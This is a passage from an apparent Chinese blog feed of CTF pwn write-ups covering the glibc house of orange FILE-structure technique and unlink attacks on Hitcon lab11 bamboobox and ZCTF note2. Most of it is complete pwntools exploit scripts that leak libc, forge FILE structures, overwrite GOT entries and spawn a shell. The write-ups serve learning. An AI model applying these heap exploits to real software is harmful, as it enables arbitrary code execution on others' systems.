[fp+0E8h]</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); </span><br><span class="line">  fp-&gt;_IO_buf_base = NULL;</span><br><span class="line">  _IO_default_finish (fp, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以知道绕过的条件是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags= 0</span><br><span class="line">fp-&gt;_IO_buf_base = binsh_addr</span><br></pre></td></tr></table></figure><p>此时我们使vtable存放指向<code>_IO_str_jumps - 8</code>处的指针 ，这样调用<code>_IO_overflow</code>时会调用到<code>_IO_str_finish</code></p><p>不过，由于<code>_IO_str_jumps</code>不在符号表内，所以只能通过其他函数来间接得到它的地址，例如<code>_IO_str_underflow</code>，我们已知<font color="red">_IO_str_jumps 的地址大于_IO_file_jumps 地址</font>，可以用此来确认_IO_str_underflow的地址，并且<code>_IO_str_underflow</code>=<code>_IO_str_jummps+0x20</code></p><p>然后我在<a href="https://xz.aliyun.com/t/2411" target="_blank" rel="noopener">大佬的博客</a>里看到一个特别6的方法可以直接算出偏移（不用手算！）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IO_file_jumps_offset = libc.sym[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">IO_str_underflow_offset = libc.sym[<span class="string">'_IO_str_underflow'</span>]</span><br><span class="line"><span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        <span class="keyword">print</span> possible_IO_str_jumps_offset</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>因为满足了if之后，会<code>call qword ptr [fp+0E8h]</code></p><p>所以我们使</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp+0xe8 = system_addr</span><br></pre></td></tr></table></figure><p>就可以实现getshell了</p><p>这个方法在glibc 2.23和glibc 2.24里都适用</p><p>所以我们用上面那题来试一下这个方法，运用了大佬微博里自定义的的封装函数，构造我们的exp，然后就发现我们getshell成功了</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import*</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p = process(&apos;./houseoforange&apos;)</span><br><span class="line">elf = ELF(&apos;./houseoforange&apos;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">def add(size,name,price,color):</span><br><span class="line">p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;name :&quot;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&quot;Name :&quot;)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(&quot;Orange:&quot;)</span><br><span class="line">p.sendline(str(price))</span><br><span class="line">p.recvuntil(&quot;Orange:&quot;)</span><br><span class="line">p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upgrade(size,name,price,color):</span><br><span class="line">p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line">p.recvuntil(&quot;name :&quot;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&quot;Name:&quot;)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(&quot;Orange:&quot;)</span><br><span class="line">p.sendline(str(price))</span><br><span class="line">p.recvuntil(&quot;Orange:&quot;)</span><br><span class="line">p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def see():</span><br><span class="line">p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pack_file(_flags = 0,</span><br><span class="line">              _IO_read_ptr = 0,</span><br><span class="line">              _IO_read_end = 0,</span><br><span class="line">              _IO_read_base = 0,</span><br><span class="line">              _IO_write_base = 0,</span><br><span class="line">              _IO_write_ptr = 0,</span><br><span class="line">              _IO_write_end = 0,</span><br><span class="line">              _IO_buf_base = 0,</span><br><span class="line">              _IO_buf_end = 0,</span><br><span class="line">              _IO_save_base = 0,</span><br><span class="line">              _IO_backup_base = 0,</span><br><span class="line">              _IO_save_end = 0,</span><br><span class="line">              _IO_marker = 0,</span><br><span class="line">              _IO_chain = 0,</span><br><span class="line">              _fileno = 0,</span><br><span class="line">              _lock = 0,</span><br><span class="line">              _wide_data = 0,</span><br><span class="line">              _mode = 0):</span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">             p32(0) + \</span><br><span class="line">             p64(_IO_read_ptr) + \</span><br><span class="line">             p64(_IO_read_end) + \</span><br><span class="line">             p64(_IO_read_base) + \</span><br><span class="line">             p64(_IO_write_base) + \</span><br><span class="line">             p64(_IO_write_ptr) + \</span><br><span class="line">             p64(_IO_write_end) + \</span><br><span class="line">             p64(_IO_buf_base) + \</span><br><span class="line">             p64(_IO_buf_end) + \</span><br><span class="line">             p64(_IO_save_base) + \</span><br><span class="line">             p64(_IO_backup_base) + \</span><br><span class="line">             p64(_IO_save_end) + \</span><br><span class="line">             p64(_IO_marker) + \</span><br><span class="line">             p64(_IO_chain) + \</span><br><span class="line">             p32(_fileno)</span><br><span class="line">    file_struct = file_struct.ljust(0x88, &quot;\x00&quot;)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(0xa0, &quot;\x00&quot;)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(0xc0, &apos;\x00&apos;)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(0xd8, &quot;\x00&quot;)</span><br><span class="line">    return file_struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr):</span><br><span class="line">    payload = pack_file(_flags = 0,</span><br><span class="line">                        _IO_read_ptr = 0x61, #smallbin4file_size</span><br><span class="line">                        _IO_read_base = _IO_list_all_ptr-0x10, # unsorted bin attack _IO_list_all_ptr,</span><br><span class="line">                        _IO_write_base = 0,</span><br><span class="line">                        _IO_write_ptr = 1,</span><br><span class="line">                        _IO_buf_base = binsh_addr,</span><br><span class="line">                        _mode = 0,</span><br><span class="line">                        )</span><br><span class="line">    payload += p64(_IO_str_jumps_addr-8)</span><br><span class="line">    payload += p64(0) # paddding</span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line">add(0x10,&apos;aaaa&apos;,32,1)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">upgrade(0x40,&apos;a&apos;*0x10+p64(0)+p64(0x21)+&apos;a&apos;*0x10+p64(0)+p64(0xfa1),32,1)</span><br><span class="line"></span><br><span class="line">add(0xfb0,&apos;aaaa&apos;,32,1) #in unsorted bin list</span><br><span class="line"></span><br><span class="line">add(0x400,&apos;b&apos;*8,32,1)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">see()</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;b&apos;*8)</span><br><span class="line">main_arena = u64(p.recv(6).ljust(8,&apos;\x00&apos;)) - 1640</span><br><span class="line"></span><br><span class="line">print hex(main_arena)</span><br><span class="line">libc_base = main_arena - 0x3c4b20</span><br><span class="line">print hex(libc_base)</span><br><span class="line"></span><br><span class="line">upgrade(0x400,&apos;b&apos;*0x10,32,1)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(&apos;b&apos;*0x10)</span><br><span class="line">heap_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print hex(heap_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_IO_list_all = libc.symbols[&apos;_IO_list_all&apos;] + libc_base</span><br><span class="line">system = libc.symbols[&apos;system&apos;] + libc_base</span><br><span class="line">binsh_addr = next(libc.search(&quot;/bin/sh&quot;)) + libc_base</span><br><span class="line">IO_file_jumps_offset = libc.sym[&apos;_IO_file_jumps&apos;]</span><br><span class="line">IO_str_underflow_offset = libc.sym[&apos;_IO_str_underflow&apos;]</span><br><span class="line">for ref_offset in libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - 0x20</span><br><span class="line">    if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        print possible_IO_str_jumps_offset</span><br><span class="line">        break</span><br><span class="line">        </span><br><span class="line">_IO_str_jumps_addr=libc_base + possible_IO_str_jumps_offset</span><br><span class="line">print hex(_IO_str_jumps_addr)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x400+p64(0)+p64(0x21)+p32(666)+p32(0xddaa)+p64(0)</span><br><span class="line">file = pack_file_flush_str_jumps(_IO_str_jumps_addr,_IO_list_all,system,binsh_addr)</span><br><span class="line">pay+=file</span><br><span class="line">upgrade(0x800,pay,32,2)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Your choice : &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>　　</p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://www.anquanke.com/post/id/85127" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85127</a><br><a href="https://bbs.pediy.com/thread-251195.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251195.htm</a><br><a href="https://www.cnblogs.com/shangye/p/6268981.html" target="_blank" rel="noopener">https://www.cnblogs.com/shangye/p/6268981.html</a><br><a href="https://www.jianshu.com/p/4b0a73f321f9" target="_blank" rel="noopener">https://www.jianshu.com/p/4b0a73f321f9</a><br><a href="https://xz.aliyun.com/t/2411" target="_blank" rel="noopener">https://xz.aliyun.com/t/2411</a></p><p>　　</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实之前从来没碰到house of orange的题，然后在想学io_file的时候看到有提到这个，就去了解了一下house of orange的原理。&lt;/p&gt;
&lt;h3 id=&quot;对于house-of-orange操作的理解（glibc2-23）&quot;&gt;&lt;a href=&quot;#对于house-of-orange操作的理解（glibc2-23）&quot; class=&quot;headerlink&quot; title=&quot;对于house of orange操作的理解（glibc2.23）&quot;&gt;&lt;/a&gt;对于house of orange操作的理解（glibc2.23）&lt;/h3&gt;&lt;p&gt;大体上是，没有&lt;font color=&quot;red&quot;&gt;free&lt;/font&gt;函数，通过&lt;font color=&quot;red&quot;&gt;改写top chunk&lt;/font&gt;，使top chunk的大小不能满足我们要malloc的大小，则malloc后，原来的top chunk会被释放，并置入到unsorted bin的队列。这样就可以到达不通过free也能把chunk写到unsorted bin的队列里面的目的了。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="http://yoursite.com/2020/02/18/unlink/"/>
    <id>http://yoursite.com/2020/02/18/unlink/</id>
    <published>2020-02-18T14:44:29.000Z</published>
    <updated>2020-02-20T14:17:19.658Z</updated>
    
    <content type="html"><![CDATA[<p>把ctf wiki里的unlink题简单的做了一下<br>先简单的记录一下，以后吃透了再回来好好的填填坑</p><p>理解了一下unlink的操作<br>就是构造一个chunk，例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x1302000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x1302010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000040</span>  <span class="comment">#fack_chunk（构造成一个free掉的样子）  0x51的chunk，就在他下面构造一个刚好可以填满这个chunk的new chunk，即-0x11</span></span><br><span class="line"><span class="number">0x1302020</span>:<span class="number">0x00000000006030d0</span><span class="number">0x00000000006030d8</span></span><br><span class="line"><span class="number">0x1302030</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x1302040</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x1302050</span>:<span class="number">0x0000000000000040</span><span class="number">0x00000000000000a0</span>  <span class="comment">#p位改成0，free下一个chunk之后会与上一个chunk合并</span></span><br><span class="line"><span class="number">0x1302060</span>:<span class="number">0x654420746f626f52</span><span class="number">0x00000000006c6976</span></span><br><span class="line"><span class="number">0x1302070</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x1302080</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x1302090</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020f11</span></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="Hitcon-training-lab11-bamboobox"><a href="#Hitcon-training-lab11-bamboobox" class="headerlink" title="Hitcon-training lab11 bamboobox"></a>Hitcon-training lab11 bamboobox</h2><p>unlink的很重要一个条件就是已知存储各个堆块地址的位置。</p><p>unlink操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>) <span class="comment">#chunk0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'bbbbbb'</span>) <span class="comment">#chunk1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'cccccc'</span>) <span class="comment">#chunk2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6020c8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fack chunk（构造成被free掉的样子</span></span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) </span><br><span class="line">pay += p64(fd)</span><br><span class="line">pay += p64(bk)</span><br><span class="line">pay += <span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">pay += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x90</span>,pay)</span><br><span class="line">remove(<span class="number">1</span>)  <span class="comment">#free chunk1，使chunk1往前合并,触发unlink</span></span><br></pre></td></tr></table></figure><p>则chunk0就变成了发错fack_chunk里面的fd和bk，所指向的target<br>改target的内容为我们想覆写的一个got表地址，这样show的时候也可以leak出libc来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x10</span>+ p64(<span class="number">0x80</span>) + p64(<span class="number">0x602068</span>) <span class="comment">#把atoi的got表地址覆写成chunk0里面</span></span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x60</span>,payload)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">"0 : "</span>) </span><br><span class="line">atoi_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) </span><br><span class="line"><span class="keyword">print</span> hex(atio_addr)</span><br><span class="line">libc_base=atoi_addr<span class="number">-0x36E80</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line"></span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x8</span>,p64(one_gadget)) <span class="comment">#把atoi got表里的内容改为one gadget</span></span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">r=process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./bamboobox'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = remote(host,port)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Please enter the length of item name:"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx,length,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Please enter the index of item:"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'aaaaaa'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'bbbbbb'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'cccccc'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6020c8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pay ='a'*0x10</span></span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) </span><br><span class="line">pay += p64(fd)</span><br><span class="line">pay += p64(bk)</span><br><span class="line">pay += <span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">pay += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x90</span>,pay)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x10</span>+ p64(<span class="number">0x80</span>) + p64(<span class="number">0x602068</span>)</span><br><span class="line"></span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x60</span>,payload)</span><br><span class="line">show()</span><br><span class="line"><span class="comment"># r.recv()</span></span><br><span class="line">r.recvuntil(<span class="string">"0 : "</span>)</span><br><span class="line">atoi_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(atoi_addr)</span><br><span class="line"></span><br><span class="line">libc_base=atio_addr<span class="number">-0x36E80</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">system = libc_base + <span class="number">0x45390</span></span><br><span class="line"><span class="comment"># r.recv()</span></span><br><span class="line"><span class="comment"># modify(0,0x8,p64(system))</span></span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x8</span>,p64(one_gadget))</span><br><span class="line"><span class="comment"># r.recvuntil(":")</span></span><br><span class="line"><span class="comment"># r.sendline("$0")</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><p>unlink来说就是构造一个fack_chunk（为free完的样子）如果可以overlap的话，直接写在下一个chunk的top，size的p位为0，如果不可以的overlap的话，就是这题一样，<code>利用两个chunk来构造一个fack_chunk</code>，free掉fack_chunk后面那个chunk，使之合并，触发unlink。</p><p>和lab11差不多的方法</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 